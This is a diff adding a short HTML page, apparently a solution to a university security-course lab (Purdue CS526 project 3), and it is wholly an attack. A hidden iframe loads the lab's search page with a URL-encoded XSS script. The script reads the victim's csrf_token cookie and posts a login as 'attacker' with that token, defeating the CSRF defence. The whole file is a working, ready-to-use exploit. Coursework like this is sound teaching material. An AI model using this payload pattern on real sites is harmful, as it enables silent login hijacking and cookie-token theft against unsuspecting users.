@@ -1,0 +1,5 @@
+<html>
+	<body>
+		<iframe src="http://cs526-offline.cs.purdue.edu/project3/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3E%20%09%09%09%0A%24(%20document%20).ready(%20function()%20%7B%20%09%09%09%09%0AstartIndex%20%3D%20document.cookie.indexOf(%22csrf_token%3D%22)%2B11%3B%20%09%09%09%09%0AendIndex%20%3D%20document.cookie.indexOf(%22%3B%22%2C%20startIndex)%3B%0Aif%20(endIndex%20%3D%3D%20-1)%20%7BendIndex%3Ddocument.cookie.length%7D%3B%09%09%0AcookieString%20%3D%20document.cookie.substr(startIndex%2CendIndex-startIndex)%3B%20%09%09%09%09%0A%24.post(%27http%3A%2F%2Fcs526-offline.cs.purdue.edu%2Fproject3%2Flogin%3Fcsrfdefense%3D1%26xssdefense%3D0%27%2C%20%7Busername%3A%20%27attacker%27%2C%20password%3A%20%27123456%27%2C%20csrf_token%3A%20cookieString%20%7D)%3B%20%7D)%3B%20%0A%3C%2Fscript%3E" name="myiframe" style="display: none;"></iframe>
+	</body>
+</html>
